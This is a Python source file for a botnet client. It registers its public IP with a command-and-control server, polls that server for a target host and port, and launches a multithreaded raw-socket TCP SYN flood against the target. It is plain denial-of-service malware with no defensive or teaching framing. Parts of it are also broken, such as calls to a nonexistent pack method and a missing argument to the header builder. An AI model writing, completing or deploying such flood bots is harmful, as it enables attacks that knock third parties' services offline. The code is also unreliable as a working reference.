import socket, urllib.request, random, time, threading


class Bot:
    def __init__(self, server):
        self.server = server
        self.announce()

    def should_attack(self):
        try:
            resp = urllib.request.urlopen(f'{self.server}/scary').read().decode('utf-8')
            if 'lez hit em ' in resp:
                return resp.replace('lez hit em ', '').split(':')
            else:
                return False
        except:
            return False

    def announce(self):
        self.ip = urllib.request.urlopen('https://api.ipify.org/?format=plaintext').read().decode('utf-8')
        try:
            urllib.request.urlopen(f'{self.server}/hellonewfriend/{self.ip}').close()
        except:
            pass

    def header(self, ip):
        ihl = 5
        version = 4
        tos = 0
        tot_len = 20 + 20
        id = random.randint(1,65535)
        frag_off = 0
        ttl = random.randint(1,255)
        protocol = socket.IPPROTO_TCP
        check = 10
        saddr = socket.inet_aton(self.ip)
        daddr = socket.inet_aton(ip)
        ihl_version = (version << 4) + ihl
        self.ip_header = self.pack('!BBHHHBBH4s4s',ihl_version,tos,tot_len,id,frag_off,ttl,protocol,check,saddr,daddr)

    def checksum(self, msg):
        s = 0
        for i in range(0,len(msg),2):
            w = (ord(msg[i]) << 8) + (ord(msg[i + 1]))
            s = s + w

        s = (s >> 16) + (s & 0xffff);
        s = ~s & 0xffff

        return s

    def tcp(self, ip, port):
        self.header()
        source = random.randint(36000,65535)
        dest = int(port)
        seq = 0
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0
        offset_res = (doff << 4) + 0
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        tcp_header = self.pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_ptr)
        source_address = socket.inet_aton(self.ip)
        dest_address = socket.inet_aton(ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        psh = self.pack('!4s4sBBH',source_address,dest_address,placeholder,protocol,tcp_length);
        psh = psh + tcp_header;
        tcp_checksum = self.checksum(psh)
        tcp_header = self.pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_ptr)
        self.packet = self.ip_header + tcp_header

    def attack(self, host, port):
        counter = 0
        attack = True
        s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
        while attack:
            self.tcp(host,port)
            s.sendto(self.packet,(host,0))
            counter +=1
            if counter == 30:
                if not self.should_attack():
                    attack = False
                else:
                    counter = 0


announce_counter = 0
start_time = int(round(time.time() * 1000))
Luca = Bot('http://127.0.0.1:5000')
while True:
    current_time = int(round(time.time() * 1000))
    if (current_time - start_time) >= 5000:
        bro_should_i_attack = Luca.should_attack()
        if bro_should_i_attack:
            threads = []
            for i in range(int(135)):
                t = threading.Thread(target=Luca.attack, args=(bro_should_i_attack[0], int(bro_should_i_attack[1])))
                t.daemon = True
                t.start()
                threads.append(t)
            for x in threads:
                x.join()
        announce_counter += 1
        if announce_counter == 5:
            Luca.announce()
            announce_counter = 0
        start_time = int(round(time.time() * 1000))
